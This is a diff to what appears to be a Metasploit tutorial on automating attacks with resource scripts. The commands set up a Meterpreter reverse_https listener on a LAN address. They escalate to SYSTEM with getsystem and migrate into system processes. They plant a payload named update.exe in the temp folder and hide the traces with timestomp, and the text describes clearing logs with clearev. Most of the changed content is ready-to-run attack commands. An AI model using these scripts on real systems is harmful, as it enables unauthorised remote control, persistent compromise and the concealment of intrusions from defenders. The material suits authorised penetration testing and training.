@@ -72,6 +72,7 @@
          echo 'set PAYLOAD windows/meterpreter/reverse_https' >> my_resource_file.rc
          echo 'set LHOST 192.168.1.71' >> my_resource_file.rc
          echo 'set LPORT 666' >> my_resource_file.rc
+         echo 'set ExitOnSession false' >> my_resource_file.rc
          echo 'exploit' >> my_resource_file.rc
 
     `[run]` msfconsole -r my_resource_file.rc
@@ -83,6 +84,7 @@
       msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
       msf exploit(multi/handler) > set LHOST 192.168.1.71
       msf exploit(multi/handler) > set LPORT 666
+      msf exploit(multi/handler) > set ExitOnSession false
       msf exploit(multi/handler) > exploit
 
       msf exploit(multi/handler) > makerc /root/my_resource_file.rc
@@ -98,17 +100,18 @@
 <br /><br /><br />
 
 ## RESOURCE SCRIPTS IN POST EXPLOITATION
+<blockquote>Auto-run scripts are great when you need multiple modules to run automatically.<br />Lets assume the first thing(s) we do after a successfully exploitation its elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a resource script saves us time (automation).</blockquote>
 
-- **FFF**
-<blockquote>Auto-run scripts are great when you need multiple modules to run automatically</blockquote>
+- **Resource script to elevate session,take screenshots, migrate and run post-modules::**`[bash prompt]`<br />
 
       touch my_resource_file.rc
 
-        echo 'getsystem' > my_resource_file.rc
+        echo 'getprivs' > my_resource_file.rc
+        echo 'getsystem' >> my_resource_file.rc
         echo 'screenshot -v -p IClass.jpeg -v true' >> my_resource_file.rc
-        echo 'run post/windows/manage/migrate' >> my_resource_file.rc
-        echo 'run post/windows/gather/enum_logged_on_users' >> my_resource_file.rc
+        echo 'run migrate -n wininit.exe' >> my_resource_file.rc
         echo 'run post/windows/gather/enum_applications' >> my_resource_file.rc
+        echo 'run post/multi/recon/local_exploit_suggester' >> my_resource_file.rc
 
 <br />
 
@@ -116,12 +119,14 @@
 
 <br />
 
-- **FFF**
-<blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically</blockquote>
+<blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically<br />This next example demonstrates how to use resource scripts to successfully persiste a payload in target system and clean tracks (timestomp & clearev) using meterpreter core commands</blockquote>
+
+- **Resource script to elevate session, migrate, persiste payload and clear tacks::**`[bash prompt]`<br />
 
       touch my_resource_file.rc
 
-        echo 'getsystem' > my_resource_file.rc
+        echo 'getprivs' > my_resource_file.rc
+        echo 'getsystem' >> my_resource_file.rc
         echo 'run migrate -n explorer.exe' >> my_resource_file.rc
         echo 'upload update.exe %temp%\\update.exe' >> my_resource_file.rc
         echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> my_resource_file.rc
